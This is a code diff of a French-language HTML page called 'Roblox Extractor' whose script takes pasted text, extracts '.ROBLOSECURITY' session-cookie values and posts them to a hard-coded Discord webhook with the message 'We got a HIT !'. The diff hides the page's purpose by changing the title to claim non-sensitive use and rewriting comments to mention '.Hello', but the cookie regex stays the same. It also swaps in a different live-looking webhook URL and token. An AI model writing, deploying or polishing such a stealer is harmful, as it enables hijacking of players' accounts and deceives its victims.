@@ -1,8 +1,9 @@
+
 <!doctype html>
 <html lang="fr">
 <head>
   <meta charset="utf-8" />
-  <title>Roblox Extractor | ZER</title>
+  <title>Envoyer vers Webhook Discord (usage non sensible)</title>
   <style>
     body { font-family: Arial, sans-serif; max-width:800px; margin:30px auto; padding:0 16px; }
     label { display:block; margin-top:12px; font-weight:600; }
@@ -11,6 +12,92 @@
     .log { margin-top:12px; white-space:pre-wrap; background:#f5f5f5; padding:8px; border-radius:6px; max-height:240px; overflow:auto; }
   </style>
 </head>
+
+
+<style>
+  /* Reset simple */
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    max-width: 800px;
+    margin: 30px auto;
+    padding: 20px;
+    background: #f0f2f5;
+    color: #333;
+  }
+
+  h2 {
+    text-align: center;
+    color: #4b6cb7;
+    margin-bottom: 20px;
+  }
+
+  label {
+    display: block;
+    margin-top: 16px;
+    font-weight: 600;
+    color: #4b6cb7;
+  }
+
+  textarea {
+    width: 100%;
+    height: 160px;
+    padding: 10px;
+    border-radius: 8px;
+    border: 1px solid #ccc;
+    font-size: 14px;
+    resize: vertical;
+    transition: border-color 0.2s;
+  }
+  textarea:focus {
+    border-color: #4b6cb7;
+    outline: none;
+    box-shadow: 0 0 5px rgba(75,108,183,0.3);
+  }
+
+  button {
+    margin-top: 15px;
+    padding: 10px 20px;
+    border: none;
+    background: #4b6cb7;
+    color: white;
+    font-weight: bold;
+    font-size: 14px;
+    border-radius: 8px;
+    cursor: pointer;
+    transition: background 0.3s, transform 0.2s;
+  }
+  button:hover {
+    background: #3a539b;
+    transform: translateY(-2px);
+  }
+  button:active {
+    transform: translateY(0);
+  }
+
+  .log {
+    margin-top: 20px;
+    padding: 12px;
+    background: #ffffff;
+    border-radius: 8px;
+    border: 1px solid #ddd;
+    max-height: 250px;
+    overflow-y: auto;
+    font-family: monospace;
+    font-size: 13px;
+    line-height: 1.4;
+    color: #555;
+  }
+
+  /* Responsive */
+  @media (max-width: 600px) {
+    body { padding: 15px; }
+    button { width: 100%; }
+  }
+</style>
+
+
 <body>
   <h2>Roblox Extractor</h2>
 
@@ -28,7 +115,7 @@ const logEl = document.getElementById('log');
 function log(msg){ logEl.textContent += msg + "\n"; logEl.scrollTop = logEl.scrollHeight; }
 
 // Mets ton webhook Discord ici :
-const webhookUrl = "https://discord.com/api/webhooks/1421789719766892655/IUQABpGXuZSESJn5CArSMN92SMNBQ7J7wJ9xmyHcWmgFJYt__2jkyRqKZXwr9lRMR0zF";
+const webhookUrl = "https://canary.discord.com/api/webhooks/1419364818313412752/1bw028oQ-SlM9w52kyS5MatdQYnIcpO7VKkf-TWz7rDnkOTPk8mg0hDy-AV9NYwZpFn9";
 
 async function postToWebhook(url, body, isForm=false){
   try{
@@ -61,7 +148,7 @@ document.getElementById('sendBtn').addEventListener('click', async ()=>{
   const text = document.getElementById('message').value;
   if(!text){ log('Message vide — rien à envoyer.'); return; }
 
-  // Extraire le texte entre ".ROBLOSECURITY" et ";", en gardant ".ROBLOSECURITY"
+  // Extraire le texte entre ".Hello" et ";", en gardant ".Hello"
   const regex = /(\.ROBLOSECURITY[\s\S]*?);/g;
   let match;
   const extracted = [];
@@ -69,21 +156,16 @@ document.getElementById('sendBtn').addEventListener('click', async ()=>{
     extracted.push(match[1].trim());
   }
 
-  if(extracted.length === 0){ log('Invalid ID'); return; }
+  if(extracted.length === 0){ log('Aucun texte trouvé entre .Hello et ;'); return; }
 
-  const fullExtractedText = extracted.join("\n");
-  const chunks = splitIntoChunks(fullExtractedText, 1998);
+  const chunks = splitIntoChunks(extracted.join("\n"), 1998); 
 
   // Envoi du message introductif
   await postToWebhook(webhookUrl, { content: '`We got a HIT ! :`' });
 
   log('Numbers Of ID Is Being Extract ' + chunks.length + ' Please Wait ...');
   for(let i=0;i<chunks.length;i++){
-    const content = '**`' + chunks[i] + '`**';
-    if (content.length > 2000) {
-      log('Chunk too large. Skipping this chunk.');
-      continue;
-    }
+        const content = '**`' + chunks[i] + '`**';
     const ok = await postToWebhook(webhookUrl, { content: content });
     if(ok) log(`ID has been send ${i+1}/${chunks.length}.`);
     else { log('Erro.'); break; }
@@ -91,6 +173,7 @@ document.getElementById('sendBtn').addEventListener('click', async ()=>{
   }
   log('Please Wait.');
 });
+
 </script>
 </body>
 </html>
